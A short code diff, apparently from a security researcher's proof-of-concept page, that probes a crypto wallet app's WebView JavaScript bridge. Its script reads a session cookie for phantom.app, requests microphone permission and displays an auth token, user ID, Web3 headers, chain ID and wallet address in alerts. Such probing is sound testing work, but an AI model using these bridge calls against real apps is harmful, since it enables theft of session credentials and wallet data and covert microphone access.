@@ -14,14 +14,14 @@
 	
 	<script>
 		alert(ReactNativeWebView.getCookie('https://phantom.app/','JSESSIONID'));
-		ReactNativeWebView.requestNativePermission("android.permission.RECORD_AUDIO");
-		ReactNativeWebView.getResources("android.permission.RECORD_AUDIO");  
-		ReactNativeWebView.permissionRequest("android.permission.RECORD_AUDIO");  
-		alert(ReactNativeWebView.getUniqueAuthToken());
-		alert(ReactNativeWebView.getsettings());
-		alert(ReactNativeWebView.getUserId());
-		alert(ReactNativeWebView.getUserId());
-		alert(ReactNativeWebView.getUserId());
+		alpha.requestNativePermission("android.permission.RECORD_AUDIO");
+		alpha.getResources("android.permission.RECORD_AUDIO");  
+		alpha.permissionRequest("android.permission.RECORD_AUDIO");  
+		//alert(.getUniqueAuthToken());
+		//alert(ReactNativeWebView.getsettings());
+		alert(alpha.getWeb3Headers());
+		alert(alpha.getChainId());
+		alert(alpha.getwalletAddress());
 	    
 	</script>
 	
